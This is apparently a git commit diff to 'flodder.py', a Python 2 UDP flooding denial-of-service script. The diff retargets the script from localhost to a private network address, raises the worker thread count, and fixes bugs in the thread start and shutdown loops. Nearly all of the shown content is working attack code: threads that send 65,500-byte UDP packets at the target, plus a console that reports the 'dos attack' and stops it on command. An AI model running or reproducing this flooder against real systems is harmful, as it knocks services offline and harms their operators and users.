324d63c388a32d4dabbedeb85e6c0415f3c3dbe4
Daniel Robson <10593293@student.bpc.internal>
2017-03-27 14:09:35 +0100

    .

--- flodder.py
+++ flodder.py
@@ -2,11 +2,11 @@ import socket
 import time
 import thread
 import threading
-udp_id_addr = "127.0.0.1"
+udp_id_addr = "172.18.103.86"
 udp_port_no = 21299
 send_buff = "N" * 65500
 send_delay = None
-worker_count = 128
+worker_count = 188
 sock = None
 lock = threading.Lock()
 active_workers = 0
@@ -36,6 +36,7 @@ def worker(wk_id):
 	except Exception:
 		print("theres seems of been an error.\n")
 	rm_rk()
+	thread.exit()
 			
 if __name__ == "__main__":
 	dos_inprog = 1
@@ -43,19 +44,20 @@ if __name__ == "__main__":
 	for x in range(0, worker_count):
 		try:
 			thread.start_new_thread(worker, (x,))
-		except:
-			print ("Error: unable to start thread")
+		except Exception, errtxt:
+			print errtxt
+#			print ("Error: unable to start thread")
 	print("dos attack has started with " + str(worker_count) + " workers.")
 	print("waiting for all workers.")
 	
 	while(1):
 		print(active_workers)
-		if (active_workers == WORKERS): break
+		if (active_workers == worker_count): break
 	print("all workers are avtive.")
 	
 	while(1):
 		if (active_workers == 0): break
-		cmd = input("")
+		cmd = raw_input("please enter your command.\n")
 		if (cmd == "stop"):
 			dos_inprog = 0
 			print("waiting for workers to shutdown.")
@@ -63,3 +65,4 @@ if __name__ == "__main__":
 				None
 			print("all workers have been shutdown.")
 			break
+	socket.close(sock)
